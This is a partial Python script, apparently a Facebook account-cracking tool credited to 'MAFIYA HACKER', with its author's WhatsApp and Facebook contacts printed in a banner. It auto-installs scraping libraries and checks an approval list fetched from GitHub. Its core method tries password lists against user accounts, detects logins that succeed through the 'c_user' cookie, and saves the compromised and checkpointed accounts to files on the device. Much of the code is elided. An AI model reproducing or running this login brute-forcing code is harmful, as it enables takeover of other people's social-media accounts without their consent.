# Decompile by : MAFIYA HACKER 

import os,sys

try: import requests

except ModuleNotFoundError:print("mafiya Install Module requests");os.system("python -m pip install requests ")

try: import bs4

except ModuleNotFoundError:print("mafiya Install Module bs4");os.system("python -m pip install bs4 ")

try: import mechanize

except ModuleNotFoundError:print("mafiya Install Module mechanize");os.system("python -m pip install mechanize ")
...
def main_apv():
    ...
    try:
        ...
        os.system("xdg-open https://wa.me/qr/+919971945685")

        

    r1=requests.get("https://raw.githubusercontent.com/Mafiyahunter/Cybersecurity/main/Approval.txt").text
	...
	def __mbasic__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				...
				open('/sdcard/ID_OK.txt','a').write('%s\n' % wrt)
				...
				try:
					...
					open('/sdcard/ID_CP.txt','a').write('%s\n' % wrt)
...
\033[1;37m ｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡
\033[1;94m ⇨AUTHOR    : BLACK HACKER
\033[1;95m ⇨WHATSAPP  : +91 9971945685
\033[1;96m ⇨FACEBOOK  : MAFIYA HUNTER
